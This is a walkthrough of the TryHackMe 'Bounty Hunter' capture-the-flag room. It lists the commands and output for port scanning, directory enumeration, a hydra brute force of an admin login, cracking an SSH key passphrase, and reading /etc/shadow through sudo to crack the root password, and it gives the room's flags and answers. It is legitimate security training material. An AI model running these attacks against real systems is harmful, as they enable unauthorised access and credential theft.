# Try Hack Me - Bounty Hunter

# TASK 1

setup variable IP for easy use
```bash
export IP=10.10.127.105
```

# TASK 2

```bash
nmap -sC -sV -oN nmap/initial $IP
```

Results

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 17:48 EDT
Nmap scan report for 10.10.127.105
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                 
|_http-title: Apache2 Ubuntu Default Page: It works                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel             
```

Q. How many ports are open?
A. 2

Q. What version of SSH is running?
A. OpenSSH 7.6p1

Q. What version of Apache is running?
A. 2.4.29

Q. Which Linux distribution is running?
A. ubuntu

Q. What is the hidden directory?
A. /admin

```bash
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.127.105
```
results

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.127.105
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.127.105/admin                (Status: 301) [Size: 314] [--> http://10.10.127.105/admin/]   
```

# TASK 3

Q. What is the user:password of the admin panel?
A. admin:xavier

```bash
view source reveals "<!-- Hey john, if you do not remember, the username is admin -->"
```

lets fire up burpsuit to get the post format for username and password andf then use hydra again
```
user=admin&pass=password1
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.127.105 http-form-post "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"

```
Results
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-20 18:38:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.127.105:80/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.10.127.105   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-20 18:39:12
```

Q. What is John's RSA Private Key passphrase?
A. 

after loging in you get a change to download john's private key and this "THM{brut3_f0rce_is_e4sy}"
Lets use john the ripper to attach this file

```bash
ssh2john id_rsa > myhash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt
```

Results
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2025-06-20 18:58) 25.00g/s 1815Kp/s 1815Kc/s 1815KC/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Q. user.txt
A. THM{a_password_is_not_a_barrier}

lets ssh in using the private key and password < don't forget to chmod first!

```bash
chmod 600 id_rsa
ssh -i id_rsa  john@10.10.127.105
```

Q. Web flag
A. THM{brut3_f0rce_is_e4sy} < this is the one from the admin html page. There's no web.txt!


# TASK 4

Q. What is the root's password?
A. football

Look for sudo privesc
```bash
sudo -l
```

cat is available!
lets grab the shadow password

```bash
sudo cat /etc/shadow
cat /etc/passwd
unshadow shadow passwd > mypasswd
john mypasswd
```
results

```
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
football         (root)     
1g 0:00:00:31 14.56% 2/3 (ETA: 19:25:11) 0.03176g/s 984.4p/s 1692c/s 1692C/s 1tintin..1morris
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Q. root.txt
A. THM{pr1v1l3g3_3sc4l4t10n}

```bash
su root
# cat /root/root.txt

```

Done!



